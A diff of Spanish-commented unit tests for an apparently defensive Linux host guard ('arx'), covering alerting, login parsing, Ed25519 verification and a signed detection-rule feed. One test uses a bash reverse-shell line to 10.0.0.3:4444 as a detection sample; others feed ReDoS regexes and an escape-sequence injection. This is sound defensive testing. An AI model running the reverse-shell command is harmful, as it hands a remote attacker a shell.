@@ -404,6 +404,21 @@ class CanaryRealismTests(unittest.TestCase):
         self.assertEqual(self.c.check(), [])  # la misma lectura no se re-reporta
 
 
+class AlertWindowTests(unittest.TestCase):
+    def test_without_a_model_alerts_do_not_wait_for_the_window(self):
+        """La ventana existe para no gastar consultas al modelo. Sin modelo, retrasaba el aviso."""
+        _isolate()
+        from arx.modules import guard
+        sent = []
+        f = {"sev": "high", "kind": "integrity", "detail": "cambió cron"}
+        slow = guard.SlowLayer({}, {"meta": {}, "sets": {}})
+        slow.last_llm = time.monotonic()
+        with mock.patch.object(guard.notify, "channels", lambda c=None: ["webhook"]), \
+             mock.patch.object(guard.notify, "send", lambda text, c=None: sent.append(text)):
+            slow.feed([f], [{"new": True, "tier": 2, "status": "x"}])
+        self.assertIn("cambió cron", sent[0])
+
+
 class SlowLayerTests(unittest.TestCase):
     """El LLM solo se despierta ante lo NUEVO, agrupa y respeta presupuesto."""
 
@@ -434,7 +449,7 @@ class SlowLayerTests(unittest.TestCase):
         self.assertEqual(self.sent, [])
 
     def test_new_findings_are_batched(self):
-        layer = self.g.SlowLayer({"llm_min_interval_s": 300}, self.base)
+        layer = self.g.SlowLayer({"llm_min_interval_s": 300, "fallback_order": ["anthropic"]}, self.base)
         f, o = self._pair(new=True)
         layer.feed([f], [o])          # primera: se consulta
         layer.feed([f], [o])          # dentro de la ventana: se acumula
@@ -986,9 +1001,10 @@ class BlockIpActuatorTests(unittest.TestCase):
         self.assertFalse(any("block_ipv4" in c for c in self._flat()))
 
     def test_never_blocks_active_operator(self):
-        self._patch(self.r.recon, "collect_connections",
-                    lambda: [{"remote_ip": "198.51.100.2", "local_port": 22,
-                              "state": "ESTABLISHED"}])
+        self._patch(self.r.recon, "connection_owners",
+                    lambda: [{"remote_ip": "198.51.100.2", "local_port": 22, "state": "ESTABLISHED",
+                              "exe": "/usr/sbin/sshd", "pid": 9}])
+        self._patch(self.r, "_proc_title", lambda pid: "sshd: ana@pts/0")
         self.assertNotIn("198.51.100.2", self.r._never_block_ips())  # 1ª vista: efímero ≠ operador
         self.assertIn("198.51.100.2", self.r._never_block_ips())     # persistente = operador
         o = self.r.handle(self._scan("198.51.100.2"), enforce=True, cfg={})
@@ -2182,6 +2198,17 @@ class MetricsTests(unittest.TestCase):
         self.assertAlmostEqual(m["false_positives_per_day"], 1 / 7, places=2)
         self.assertFalse(m["within_target"])
 
+    def test_alerts_nobody_reviewed_are_not_a_success(self):
+        """Con 9 alertas sin revisar, decir "dentro del objetivo" sería falso."""
+        self._inc("a", days_ago=7)
+        m = self.m.compute(7, now=self.now)
+        self.assertIsNone(m["within_target"])
+        self.assertEqual(m["false_positives"], 0)
+
+    def test_nothing_to_review_is_within_target(self):
+        self._event(7, kind="accepted", detail="leve")
+        self.assertTrue(self.m.compute(7, now=self.now)["within_target"])
+
     def test_accepting_something_minor_does_not_count(self):
         self._inc("leve", sev="med")
         self._event(0, kind="accepted", detail="leve")
@@ -2673,9 +2700,19 @@ class LoginSensorTests(unittest.TestCase):
             self.b.run()
         self.assertEqual(set(self.b.load()["sets"]["login_users"]), {"ana", "ansible@10.0.0.5"})
 
+    def test_real_who_output_is_read_right(self):
+        """Con la salida real de `who`, no solo con el trozo ya recortado: tmux lleva otro paréntesis."""
+        who = ("root     pts/1        2026-11-05 10:20 (tmux(451).%0)\n"
+               "root     pts/2        2026-11-05 10:20 (tmux(451).%3)\n"
+               "ana      pts/3        2026-11-05 10:21 (203.0.113.9)\n"
+               "bob      tty1         2026-11-05 10:22\n"
+               "eva      pts/4        2026-11-05 10:22 (mosh [4411])\n")
+        with mock.patch.object(self.b.recon, "_run", lambda args, **k: who):
+            self.assertEqual(self.b._login_users(), ["ana@203.0.113.9", "bob", "eva@mosh"])
+
     def test_new_windows_of_a_terminal_multiplexer_are_not_new_logins(self):
-        for raw in ("tmux(1234).%0", "tmux(99).%7"):
-            self.assertEqual(self.b._login_origin(raw), "tmux")
+        for raw in ("tmux(1234).%0", "tmux(99).%7", ":pts/0:S.0"):
+            self.assertIsNone(self.b._login_origin(raw))
         self.assertEqual(self.b._login_origin("mosh [4411]"), "mosh")
         self.assertEqual(self.b._login_origin(":0"), "local")
         self.assertEqual(self.b._login_origin("203.0.113.9"), "203.0.113.9")
@@ -2695,9 +2732,11 @@ class JournalSourceTests(unittest.TestCase):
         def fake_run(argv, **kw):
             test.seen.append(argv)
             return test.answers.pop(0)
+        real_exists = os.path.exists
         for obj, name, value in ((sensors.subprocess, "run", fake_run),
                                  (sensors.shutil, "which", lambda c: f"/usr/bin/{c}"),
-                                 (sensors.os.path, "exists", lambda path: path == "/run/systemd/journal/socket")):
+                                 (sensors.os.path, "exists",
+                                  lambda path: path == "/run/systemd/journal/socket" or real_exists(path))):
             p = mock.patch.object(obj, name, value)
             p.start()
             self.addCleanup(p.stop)
@@ -2766,7 +2805,59 @@ class JournalSourceTests(unittest.TestCase):
         self.assertEqual([e["kind"] for e in ev], ["auth_bruteforce"])
 
 
+class GuardResilienceTests(unittest.TestCase):
+    def setUp(self):
+        _isolate()
+        from arx.modules import baseline, guard, response, sensors, vaccines
+        self.b, self.g, self.r, self.s, self.v = baseline, guard, response, sensors, vaccines
+
+    def test_a_broken_sensor_does_not_leave_the_host_unguarded(self):
+        """Un vaccines.json dañado lanzaría en cada barrido: quedaría una guardia ciega."""
+        base = {"meta": {}, "sets": {}, "integrity": {}}
+        with mock.patch.object(self.v, "findings", side_effect=ValueError("dañado")), \
+             mock.patch.object(self.s, "detect_uid0_accounts", side_effect=OSError("x")), \
+             mock.patch.object(self.r, "restore_kernel_blocks", side_effect=OSError("x")), \
+             mock.patch.object(self.r, "ensure_nft_tracking", lambda: False), \
+             mock.patch.object(self.b, "snapshot", lambda: {"sets": {}, "gauges": {}}), \
+             mock.patch.object(self.s, "collect_events",
+                               lambda: [{"sev": "high", "kind": "gauge", "detail": "sigue viendo", "why": "w"}]), \
+             mock.patch("sys.stdout"):
+            findings, _ = self.g.sweep(base, include_suid=False, cfg={})
+        self.assertEqual([f["detail"] for f in findings], ["sigue viendo"])
+
+    def test_the_mode_the_guard_really_runs_with_is_visible(self):
+        self.assertIsNone(self.g.mode_seen())
+        self.r.config.write_json(self.g._mode_seen_path(), {"enforce": True})
+        self.assertTrue(self.g.mode_seen())
+
+    def test_daily_report_once_a_day_and_never_the_first_time(self):
+        sent = []
+        cfg = {}
+        with mock.patch.object(self.g.notify, "channels", lambda c=None: ["webhook"]), \
+             mock.patch.object(self.g.notify, "send", lambda text, c=None: sent.append(text)):
+            self.assertFalse(self.g._daily_report(cfg, now=1000))
+            self.assertFalse(self.g._daily_report(cfg, now=1000 + 3600))
+            self.assertTrue(self.g._daily_report(cfg, now=1000 + 86400))
+            self.assertFalse(self.g._daily_report(cfg, now=1000 + 86400 + 60))
+        self.assertEqual(len(sent), 1)
+        self.assertIn("Resumen del día", sent[0])
+
+    def test_no_channels_or_turned_off_means_no_report(self):
+        self.assertFalse(self.g._daily_report({}, now=1))
+        with mock.patch.object(self.g.notify, "channels", lambda c=None: ["webhook"]), \
+             mock.patch.object(self.g.notify, "send") as send:
+            self.g._daily_report({"notify": {"daily_report": False}}, now=1)
+            self.g._daily_report({"notify": {"daily_report": False}}, now=100000)
+        send.assert_not_called()
+
+
 class ServiceOutputTests(unittest.TestCase):
+    def test_the_service_can_repair_files_in_home(self):
+        """Autorizar desde el chat ocurre dentro del servicio: con ProtectHome no podría."""
+        from arx.modules import service
+        self.assertNotIn("ProtectHome", service.unit_text("/usr/bin/arx").split("[Install]")[0].replace(
+            "Sin ProtectHome", ""))
+
     def test_guard_output_reaches_the_journal_at_once(self):
         """Bajo systemd stdout no es un terminal: sin esto, `journalctl -u arx` queda vacío (B18)."""
         _isolate()
@@ -2775,6 +2866,803 @@ class ServiceOutputTests(unittest.TestCase):
         with mock.patch.object(guard.sys, "stdout", out), mock.patch.object(guard.config, "load_config", lambda: {}):
             guard.run()
         out.reconfigure.assert_called_once_with(line_buffering=True)
+
+
+class AcceptFlowTests(unittest.TestCase):
+    """Si dices que algo es normal, debe dejar de molestar en ese momento y sin reiniciar nada."""
+
+    def setUp(self):
+        self.d = _isolate()
+        from arx import cli
+        from arx.modules import baseline, guard, response
+        self.cli, self.b, self.g, self.r = cli, baseline, guard, response
+        self.calls = []
+
+        class R:
+            returncode, stderr, stdout = 0, "", ""
+
+        def fake_run(argv, **kw):
+            self.calls.append(" ".join(argv))
+            return R()
+        for obj, name, value in ((response, "_is_linux_root", lambda: True), (response, "ssh_ports", lambda: {22}),
+                                 (response, "_nft_setup", lambda: True),
+                                 (response.shutil, "which", lambda c: f"/usr/sbin/{c}" if c != "ufw" else None),
+                                 (response.subprocess, "run", fake_run)):
+            p = mock.patch.object(obj, name, value)
+            p.start()
+            self.addCleanup(p.stop)
+
+    def _port(self):
+        return {"kind": "listen_ports", "sev": "high", "detail": "nuevo en listen_ports: tcp 80 all",
+                "target": {"proto": "tcp", "port": 80, "exposed": "all"}, "set": "listen_ports",
+                "item": "tcp 80 all"}
+
+    def test_accepting_lifts_the_block_right_away(self):
+        self.b.save({**self.b.new_baseline(), "sets": {"listen_ports": {}}})
+        o = self.r.handle(self._port(), enforce=True, cfg={})
+        self.assertIn("arx accept", o["status"])
+        self.calls.clear()
+        with mock.patch("sys.stdout"):
+            self.assertEqual(self.cli.main(["accept", o["fp"]]), 0)
+        self.assertTrue(any("delete element" in c and "block_tcp" in c for c in self.calls))
+        self.assertEqual(self.r._load_blocks(), [])
+        self.assertIn("tcp 80 all", self.b.load()["sets"]["listen_ports"])
+
+    def test_accepting_never_lifts_an_account_lock(self):
+        self.r._save_blocks([{"fp": "abc", "detail": "d", "expires_at": None,
+                              "revert": {"tool": "usermod", "user": "ana", "uid": 1001, "expire": ""}}])
+        self.r._save_findings({"abc": {"kind": "login_users", "item": "ana@1.2.3.4", "set": "login_users"}})
+        self.r.forget("abc")
+        self.assertEqual([a["user"] for a in self.r.locked_accounts()], ["ana"])
+
+    def test_a_legitimate_change_to_a_critical_file_can_be_accepted(self):
+        """Tras un `useradd`, la única salida era revertir /etc/passwd."""
+        crit = os.path.join(self.d, "passwd")
+        open(crit, "w").write("uno\n")
+        with mock.patch.object(self.b, "integrity_paths", lambda: {"passwd": [crit]}), \
+             mock.patch.object(self.b, "suid_fingerprint", lambda: None):
+            self.b.save({**self.b.new_baseline(), "integrity": self.b.integrity_fingerprint()})
+            open(crit, "w").write("dos\n")
+            drift = self.g._integrity_drift(self.b.load(), False)
+            self.assertEqual(len(drift), 1)
+            o = self.r.handle(drift[0], enforce=True, cfg={})
+            self.assertEqual(len(self.r.list_pending()), 1)
+            with mock.patch("sys.stdout"):
+                self.assertEqual(self.cli.main(["accept", o["fp"]]), 0)
+            self.assertEqual(self.g._integrity_drift(self.b.load(), False), [])
+        self.assertEqual(self.r.list_pending(), [])
+        # la copia buena ya es la nueva: restaurar no debe devolver el fichero viejo
+        manifest = self.r.config.read_json(self.r._vault_manifest_path(), {})
+        import hashlib
+        self.assertEqual(manifest[crit]["sha256"], hashlib.sha256(b"dos\n").hexdigest())
+
+    def test_guard_notices_an_accept_without_restarting(self):
+        base = {**self.b.new_baseline(), "sets": {"login_users": {}}, "meta": {**self.b.new_baseline()["meta"], "sealed": True}}
+        self.b.save(base)
+        seen = []
+
+        def fake_sweep(b, **k):
+            seen.append(dict(b["sets"]["login_users"]))
+            if len(seen) == 1:
+                self.b.accept("login_users", "ana@1.2.3.4")
+            return [], []
+        self.r.config.save_config({"x": 1})
+        ticks = iter([None, KeyboardInterrupt()])
+
+        def fake_sleep(_):
+            t = next(ticks)
+            if t:
+                raise t
+        with mock.patch.object(self.g, "sweep", fake_sweep), mock.patch.object(self.g.time, "sleep", fake_sleep), \
+             mock.patch.object(self.g.lic, "validate", lambda: None), mock.patch("sys.stdout"), \
+             self.assertRaises(KeyboardInterrupt):
+            self.g.run(interval=0)
+        self.assertEqual(seen[1], {"ana@1.2.3.4": 1})
+
+
+class LocalPortTests(unittest.TestCase):
+    def setUp(self):
+        _isolate()
+        from arx.modules import response
+        self.r = response
+
+    def _port(self, exposed):
+        return {"kind": "listen_ports", "sev": "high", "detail": f"nuevo: tcp 5432 {exposed}",
+                "target": {"proto": "tcp", "port": 5432, "exposed": exposed}}
+
+    def test_a_local_only_port_is_only_watched(self):
+        """Desde fuera no se llega: bloquearlo no protege nada y rompe lo que lo use."""
+        self.assertEqual(self.r.classify(self._port("local"))["tier"], 0)
+
+    def test_an_exposed_port_is_still_contained(self):
+        self.assertEqual(self.r.classify(self._port("all"))["tier"], 1)
+
+
+def _vaccine_tool():
+    import importlib.util
+    path = os.path.join(os.path.dirname(__file__), "..", "scripts", "vaccine_tool.py")
+    spec = importlib.util.spec_from_file_location("vaccine_tool", path)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod
+
+
+class Ed25519Tests(unittest.TestCase):
+    """Vectores de la RFC 8032 §7.1, y contra una implementación independiente (OpenSSL)."""
+
+    VECTORS = [
+        ("9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60",
+         "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a", "",
+         "e5564300c360ac729086e2cc806e828a84877f1eb8e5d974d873e065224901555fb8821590a33bacc61e39701cf9b46bd25bf5f0595bbe24655141438e7a100b"),
+        ("4ccd089b28ff96da9db6c346ec114e0f5b8a319f35aba624da8cf6ed4fb8a6fb",
+         "3d4017c3e843895a92b70aa74d1b7ebc9c982ccf2ec4968cc0cd55f12af4660c", "72",
+         "92a009a9f0d4cab8720e820b5f642540a2b27b5416503f8fb3762223ebdb69da085ac1e43e15996e458f3613d0f11d8c387b2eaeb4302aeeb00d291612bb0c00"),
+        ("c5aa8df43f9f837bedb7442f31dcb7b166d38535076f094b85ce3a2e0b4458f7",
+         "fc51cd8e6218a1a38da47ed00230f0580816ed13ba3303ac5deb911548908025", "af82",
+         "6291d657deec24024827e69c3abe01a30ce548a284743a445e3680d7db5ac3ac18ff9b538d16f290ae67f760984dc6594a7c15e9716ed28dc027beceea1ec40a"),
+    ]
+
+    def setUp(self):
+        from arx import ed25519
+        self.e = ed25519
+        self.tool = _vaccine_tool()
+
+    def test_rfc_vectors(self):
+        for sk, pk, msg, sig in self.VECTORS:
+            sk, pk, msg, sig = map(bytes.fromhex, (sk, pk, msg, sig))
+            self.assertTrue(self.e.verify(pk, msg, sig))
+            self.assertEqual(self.tool.public_key(sk), pk)
+            self.assertEqual(self.tool.sign(sk, msg), sig)
+
+    def test_any_change_breaks_it(self):
+        sk, pk, msg, sig = map(bytes.fromhex, self.VECTORS[2])
+        self.assertFalse(self.e.verify(pk, msg + b"x", sig))
+        self.assertFalse(self.e.verify(pk, msg, bytes([sig[0] ^ 1]) + sig[1:]))
+        self.assertFalse(self.e.verify(pk, msg, sig[:-1] + bytes([sig[-1] ^ 1])))
+        other = bytes.fromhex(self.VECTORS[0][1])
+        self.assertFalse(self.e.verify(other, msg, sig))
+
+    def test_malformed_input_is_just_false(self):
+        pk = bytes.fromhex(self.VECTORS[0][1])
+        for public, sig in ((b"", b""), (pk, b"corta"), (b"x" * 31, b"y" * 64), (b"\xff" * 32, b"\xff" * 64)):
+            self.assertFalse(self.e.verify(public, b"m", sig))
+
+    def test_a_malleable_signature_is_rejected(self):
+        """s + Q verificaría igual en una implementación que no lo compruebe."""
+        sk, pk, msg, sig = map(bytes.fromhex, self.VECTORS[0])
+        s = int.from_bytes(sig[32:], "little") + self.e._Q
+        self.assertFalse(self.e.verify(pk, msg, sig[:32] + s.to_bytes(32, "little")))
+
+    def test_against_openssl_when_it_can(self):
+        import shutil
+        import subprocess
+        d = tempfile.mkdtemp()
+        key, msgf, sigf = (os.path.join(d, n) for n in ("k.pem", "m", "s"))
+        run = lambda *a: subprocess.run(a, capture_output=True)  # noqa: E731
+        if not shutil.which("openssl") or run("openssl", "genpkey", "-algorithm", "ed25519", "-out", key).returncode:
+            self.skipTest("este openssl no tiene Ed25519")
+        open(msgf, "wb").write(b"vacuna de prueba")
+        if run("openssl", "pkeyutl", "-sign", "-inkey", key, "-rawin", "-in", msgf, "-out", sigf).returncode:
+            self.skipTest("este openssl no firma con -rawin")
+        der = run("openssl", "pkey", "-in", key, "-pubout", "-outform", "DER").stdout
+        sig = open(sigf, "rb").read()
+        self.assertTrue(self.e.verify(der[-32:], b"vacuna de prueba", sig))
+        self.assertFalse(self.e.verify(der[-32:], b"vacuna alterada", sig))
+
+
+class VaccineChannelTests(unittest.TestCase):
+    """Un canal de reglas para todos los Arx es lo que un atacante querría controlar."""
+
+    SECRET = bytes(range(32))
+
+    def setUp(self):
+        self.d = _isolate()
+        from arx.modules import response, sandbox, vaccines
+        self.v, self.r, self.sb = vaccines, response, sandbox
+        self.tool = _vaccine_tool()
+        self.key = self.tool.public_key(self.SECRET).hex()
+        vaccines._reset_index()
+        p = mock.patch.object(vaccines, "_host_samples", lambda: [])
+        p.start()
+        self.addCleanup(p.stop)
+
+    def _vaccine(self, **over):
+        return {"id": "v1", "version": 1, "description": "IP de prueba", "attack": ["T1046"],
+                "iocs": {"ips": ["185.220.101.50"]}, **over}
+
+    def _rule(self, **over):
+        return {"id": "r1", "verdict": "malicioso", "regex": r"xmr-minero-[a-z]{1,8}",
+                "must_match": ["esto es xmr-minero-abc"], "must_not_match": ["un texto normal"], **over}
+
+    def _feed(self, *vaccines, serial=1, revoked=(), secret=None):
+        import json
+        return json.dumps(self.tool.signed_feed(
+            {"serial": serial, "issued": "2026-11-05T00:00:00+00:00", "vaccines": list(vaccines),
+             "revoked": list(revoked)}, secret or self.SECRET)).encode()
+
+    def _update(self, raw, **k):
+        return self.v.update(fetch=lambda url: raw, pubkey=self.key, cfg=k.pop("cfg", {}), **k)
+
+    def _status(self, **over):
+        return self.v.validate(self._vaccine(**over), samples=[])[0]
+
+    def test_a_valid_vaccine_is_applied(self):
+        out = self._update(self._feed(self._vaccine()))
+        self.assertEqual(out["applied"], ["v1"])
+        self.assertIn("v1", self.v._load()["applied"])
+
+    def test_without_the_asl_key_the_channel_stays_closed_and_nothing_is_fetched(self):
+        fetch = mock.Mock()
+        self.assertEqual(self.v.ASL_PUBKEY, "")
+        out = self.v.update(fetch=fetch, cfg={})
+        fetch.assert_not_called()
+        self.assertIn("falta la clave", out["reason"])
+
+    def test_it_can_be_turned_off(self):
+        fetch = mock.Mock()
+        self.v.update(fetch=fetch, pubkey=self.key, cfg={"vaccines_enabled": False})
+        fetch.assert_not_called()
+
+    def test_no_network_is_not_a_problem(self):
+        def down(url):
+            raise OSError("sin red")
+        out = self.v.update(fetch=down, pubkey=self.key, cfg={})
+        self.assertFalse(out["ok"])
+        self.assertIn("la defensa sigue igual", out["reason"])
+
+    def test_tampered_feed_is_discarded_without_opening(self):
+        import base64
+        import json
+        outer = json.loads(self._feed(self._vaccine()))
+        evil = base64.b64decode(outer["payload"]).replace(b"185.220.101.50", b"185.220.101.66")
+        outer["payload"] = base64.b64encode(evil).decode()
+        with mock.patch.object(self.v.json, "loads", wraps=json.loads) as loads:
+            out = self._update(json.dumps(outer).encode())
+        self.assertIn("firma no válida", out["reason"])
+        self.assertEqual(self.v._load().get("applied"), None)
+        self.assertEqual(loads.call_count, 1)  # solo el sobre: el contenido ni se interpretó
+
+    def test_signed_by_someone_else_is_discarded(self):
+        out = self._update(self._feed(self._vaccine(), secret=bytes(range(1, 33))))
+        self.assertIn("firma no válida", out["reason"])
+
+    def test_garbage_is_discarded(self):
+        for raw in (b"", b"no es json", b"[]", b'{"payload": "x"}', b'{"payload": "%%%", "sig": "zz"}'):
+            self.assertFalse(self._update(raw)["ok"], raw)
+
+    def test_replaying_an_old_feed_does_not_undo_a_revocation(self):
+        self._update(self._feed(self._vaccine(), serial=5))
+        self._update(self._feed(serial=6, revoked=["v1"]))
+        out = self._update(self._feed(self._vaccine(), serial=5))
+        self.assertIn("repetición", out["reason"])
+        self.assertNotIn("v1", self.v._load()["applied"])
+
+    def test_signed_revocation_removes_it(self):
+        self._update(self._feed(self._vaccine(), serial=1))
+        out = self._update(self._feed(serial=2, revoked=["v1"]))
+        self.assertEqual(out["revoked"], ["v1"])
+
+    def test_same_version_is_not_reapplied_but_a_new_one_is(self):
+        self._update(self._feed(self._vaccine(), serial=1))
+        self.assertEqual(self._update(self._feed(self._vaccine(), serial=2))["applied"], [])
+        self.assertEqual(self._update(self._feed(self._vaccine(version=2), serial=3))["applied"], ["v1"])
+
+    def test_staged_rollout_can_leave_this_host_waiting(self):
+        with mock.patch.object(self.v, "_host_bucket", lambda vid: 80):
+            out = self._update(self._feed(self._vaccine(rollout=50)))
+        self.assertEqual(out["waiting"], ["v1"])
+        self.assertEqual(out["applied"], [])
+        with mock.patch.object(self.v, "_host_bucket", lambda vid: 20):
+            self.assertEqual(self._update(self._feed(self._vaccine(rollout=50), serial=2))["applied"], ["v1"])
+
+    def test_a_compromised_channel_cannot_rewrite_the_host_at_once(self):
+        many = [self._vaccine(id=f"v{i}") for i in range(self.v.MAX_NEW_PER_UPDATE + 5)]
+        out = self._update(self._feed(*many))
+        self.assertEqual(len(out["applied"]), self.v.MAX_NEW_PER_UPDATE)
+        self.assertEqual(len(out["waiting"]), 5)
+
+    def test_a_hostile_vaccine_is_rejected_even_with_a_valid_signature(self):
+        out = self._update(self._feed(self._vaccine(iocs={"ips": ["10.0.0.0/8"]})))
+        self.assertEqual(out["rejected"][0]["status"], "hostil")
+        self.assertEqual(self.v._load()["applied"], {})
+
+    def test_private_or_huge_networks_are_hostile(self):
+        for ip in ("10.0.0.1", "192.168.1.0/24", "127.0.0.1", "169.254.1.1", "0.0.0.0/0", "8.0.0.0/8", "::1", "2000::/8"):
+            self.assertEqual(self._status(iocs={"ips": [ip]}), "hostil", ip)
+        self.assertEqual(self._status(iocs={"ips": ["203.0.113.5"]}), "hostil")  # rango de documentación
+        self.assertEqual(self._status(iocs={"ips": ["8.8.8.8", "9.9.0.0/16"]}), "válida")
+
+    def test_regexes_that_could_hang_arx_are_hostile(self):
+        for rx in ("(a+)+$", "a*", "a{1,}", "(ab){1,9}", "(ab)?", "(a)\\1", "(?=a)", "a{1,9999}", "[abc", "(?P<x>a)"):
+            self.assertEqual(self._status(rules=[self._rule(regex=rx)], iocs={}), "hostil", rx)
+
+    def test_a_good_regex_passes_and_literal_braces_are_fine(self):
+        self.assertIsNone(self.v._unsafe_regex(r"a{1,8}[*+]\+\*\{x\}"))
+        self.assertEqual(self._status(rules=[self._rule()], iocs={}), "válida")
+
+    def test_a_rule_must_prove_itself(self):
+        no_proof = self._rule(must_match=[], must_not_match=["x"])
+        self.assertEqual(self._status(rules=[no_proof], iocs={}), "insuficiente")
+        blind = self._rule(must_match=["no aparece"])
+        self.assertEqual(self._status(rules=[blind], iocs={}), "insuficiente")
+        noisy = self._rule(must_not_match=["esto es xmr-minero-abc"])
+        self.assertEqual(self._status(rules=[noisy], iocs={}), "insuficiente")
+
+    def test_a_rule_that_adds_nothing_is_insufficient(self):
+        """Debe fallar sin la solución: lo que ya se detecta no demuestra nada (§12.4.3)."""
+        known = self._rule(regex=r"/dev/tcp/[0-9.]{1,15}", must_match=["bash -i >& /dev/tcp/10.0.0.3/4444 0>&1"])
+        self.assertEqual(self._status(rules=[known], iocs={}), "insuficiente")
+
+    def test_a_rule_that_fires_on_the_hosts_own_binaries_is_rejected(self):
+        status, why = self.v.validate(self._vaccine(rules=[self._rule()], iocs={}),
+                                      samples=[("/usr/bin/curl", b"xmr-minero-abc", "a" * 64)])
+        self.assertEqual(status, "insuficiente")
+        self.assertIn("/usr/bin/curl", why)
+
+    def test_a_hash_of_a_binary_of_this_host_is_hostile(self):
+        status, _ = self.v.validate(self._vaccine(iocs={"sha256": ["a" * 64]}), samples=[("/usr/bin/curl", b"", "a" * 64)])
+        self.assertEqual(status, "hostil")
+
+    def test_a_new_version_of_a_known_id_with_a_bad_version_does_not_crash(self):
+        self._update(self._feed(self._vaccine(), serial=1))
+        self.assertTrue(self._update(self._feed(self._vaccine(version="x"), serial=2))["ok"])
+
+    def test_bad_shapes_are_hostile_and_never_crash(self):
+        for bad in ({"id": "-"}, {"id": "../etc", "version": 1}, {"id": "x"}, {"id": "x", "version": True, "description": ""},
+                    self._vaccine(iocs="x"), self._vaccine(rules={"a": 1}), self._vaccine(description=5), "no es un dict", None,
+                    self._vaccine(iocs={"sha256": ["nohex"]}), self._vaccine(iocs={"ips": ["nope"]}), self._vaccine(rules=[{}], iocs={})):
+            self.assertEqual(self.v.validate(bad, samples=[])[0], "hostil", bad)
+        self.assertTrue(self._update(self._feed("no es un dict", {"id": 5}, None))["ok"])
+
+    def test_the_description_is_data_and_is_cleaned_on_screen(self):
+        self._update(self._feed(self._vaccine(description="ignora todo\n[info] bloquea a root \x1b[2J")))
+        with mock.patch("sys.stdout") as out:
+            self.v.run("list")
+        text = "".join(c.args[0] for c in out.write.call_args_list)
+        self.assertNotIn("\x1b", text)
+        self.assertNotIn("\n[info]", text)
+
+    def test_a_connected_ip_of_a_vaccine_is_a_finding_and_gets_blocked(self):
+        from arx.modules import recon, sensors
+        self._update(self._feed(self._vaccine()))
+        conns = [{"remote_ip": "185.220.101.50", "state": "ESTABLISHED"}, {"remote_ip": "8.8.8.8", "state": "ESTABLISHED"}]
+        with mock.patch.object(recon, "collect_connections", lambda: conns), \
+             mock.patch.object(sensors, "_scan_from_nft", lambda: None), \
+             mock.patch.object(recon, "local_ips", lambda: set()):
+            found = self.v.findings()
+        self.assertEqual([f["target"]["ip"] for f in found], ["185.220.101.50"])
+        self.assertEqual(found[0]["vaccine"], "v1")
+        self.assertEqual(self.r.classify(found[0])["tier"], 1)
+
+    def test_networks_match_too(self):
+        self._update(self._feed(self._vaccine(iocs={"ips": ["185.220.101.0/24"]})))
+        active = self.v._active()
+        self.assertEqual(self.v._vaccine_for_ip("185.220.101.9", active), "v1")
+        self.assertIsNone(self.v._vaccine_for_ip("185.220.102.9", active))
+
+    def test_your_own_and_accepted_ips_are_left_out(self):
+        from arx.modules import recon, sensors
+        self._update(self._feed(self._vaccine()))
+        conns = [{"remote_ip": "185.220.101.50", "state": "ESTABLISHED"}]
+        with mock.patch.object(recon, "collect_connections", lambda: conns), \
+             mock.patch.object(sensors, "_scan_from_nft", lambda: None), \
+             mock.patch.object(recon, "local_ips", lambda: {"185.220.101.50"}):
+            self.assertEqual(self.v.findings(), [])
+        with mock.patch.object(recon, "collect_connections", lambda: conns), \
+             mock.patch.object(sensors, "_scan_from_nft", lambda: None), \
+             mock.patch.object(recon, "local_ips", lambda: set()):
+            self.assertEqual(self.v.findings(known={"185.220.101.50": 1}), [])
+
+    def test_a_vaccine_reaches_the_static_analysis(self):
+        sample = os.path.join(self.d, "muestra")
+        open(sample, "w").write("esto es xmr-minero-abc\n")
+        self.assertEqual(self.sb.analyze(sample)["verdict"], "limpio")
+        self._update(self._feed(self._vaccine(rules=[self._rule()], iocs={})))
+        rep = self.sb.analyze(sample)
+        self.assertEqual(rep["verdict"], "malicioso")
+        self.assertEqual(rep["hits"][0]["vaccine"], "v1")
+
+    def test_a_known_hash_is_malicious(self):
+        import hashlib
+        sample = os.path.join(self.d, "muestra")
+        open(sample, "w").write("contenido inocuo\n")
+        sha = hashlib.sha256(b"contenido inocuo\n").hexdigest()
+        self._update(self._feed(self._vaccine(iocs={"sha256": [sha]})))
+        self.assertEqual(self.sb.analyze(sample)["verdict"], "malicioso")
+
+    def test_expired_vaccines_stop_applying(self):
+        self._update(self._feed(self._vaccine(expires="2020-01-01T00:00:00+00:00")))
+        self.assertEqual(self.v._active()["ips"], {})
+
+    def test_three_denials_roll_it_back_and_it_does_not_come_back(self):
+        self._update(self._feed(self._vaccine(), serial=1))
+        self.assertFalse(self.v.note_false_positive("v1"))
+        self.assertFalse(self.v.note_false_positive("v1"))
+        self.assertTrue(self.v.note_false_positive("v1"))
+        self.assertEqual(self.v._active()["ips"], {})
+        self.assertEqual(self._update(self._feed(self._vaccine(), serial=2))["applied"], [])
+
+    def test_accepting_a_finding_counts_against_its_vaccine(self):
+        from arx import cli
+        from arx.modules import baseline
+        baseline.save(baseline.new_baseline())
+        self._update(self._feed(self._vaccine()))
+        f = {"sev": "high", "kind": "intel_ip", "detail": "IP señalada por la vacuna v1: 185.220.101.50",
+             "target": {"ip": "185.220.101.50"}, "set": "intel_allow", "item": "185.220.101.50",
+             "vaccine": "v1", "fp_key": "intel_ip|185.220.101.50"}
+        o = self.r.handle(f, cfg={})
+        with mock.patch("sys.stdout"):
+            self.assertEqual(cli.main(["accept", o["fp"]]), 0)
+        self.assertEqual(self.v._load()["applied"]["v1"]["false_positives"], 1)
+        self.assertIn("185.220.101.50", baseline.load()["sets"]["intel_allow"])
+
+    def test_the_operator_can_remove_one(self):
+        self._update(self._feed(self._vaccine()))
+        self.assertTrue(self.v.remove("v1"))
+        self.assertFalse(self.v.remove("v1"))
+        self.assertEqual(self.v._active()["ips"], {})
+
+    def test_update_is_due_once_a_day(self):
+        self.assertTrue(self.v.due())
+        now = datetime.now(timezone.utc)
+        self.v._save({"last_check": now.isoformat()})
+        self.assertFalse(self.v.due(now + timedelta(hours=23)))
+        self.assertTrue(self.v.due(now + timedelta(hours=25)))
+
+    def test_a_failed_update_never_reaches_the_guard(self):
+        with mock.patch.object(self.v, "update", side_effect=RuntimeError("boom")):
+            self.v.update_safely()
+
+    def test_what_can_be_shared_says_nothing_of_this_host(self):
+        from arx.modules import forensics, recon
+        self.r.handle({"kind": "auth_bruteforce", "sev": "high", "target": {"ip": "8.8.4.4"},
+                       "detail": "8 fallos de autenticación desde 8.8.4.4 (usuario más probado: alice)"}, cfg={})
